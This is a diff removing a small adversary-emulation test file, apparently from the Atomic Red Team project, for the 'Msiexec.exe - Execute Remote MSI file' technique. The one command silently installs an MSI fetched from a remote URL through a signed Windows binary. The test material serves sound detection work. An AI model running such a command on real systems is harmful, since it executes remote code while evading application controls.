@@ -1,7 +1,0 @@
-#TechniqueName: Signed Binary Proxy Execution: Msiexec
-#AtomicTestName: Msiexec.exe - Execute Remote MSI file
-#Language: cmd
-
-#commands
-msiexec.exe /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/Win32/T1218.msi"
-
